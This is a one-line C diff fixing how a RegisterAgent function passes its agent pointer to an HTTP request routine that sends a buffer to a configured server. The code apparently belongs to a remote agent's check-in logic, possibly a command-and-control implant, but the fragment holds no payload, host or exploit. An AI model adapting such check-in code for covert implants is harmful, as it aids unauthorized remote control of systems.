@@ -12,7 +12,7 @@ BOOL RegisterAgent(pAgent agent, VOID* Buffer, ULONG BufferLength) {
 
 	
 
-	PerformRequest(&agent, UserAgent, HttpEndpoint, HttpServer, Buffer, BufferLength, RequestHeaders);
+	PerformRequest(agent, UserAgent, HttpEndpoint, HttpServer, Buffer, BufferLength, RequestHeaders);
 	
 	return 1;
 }
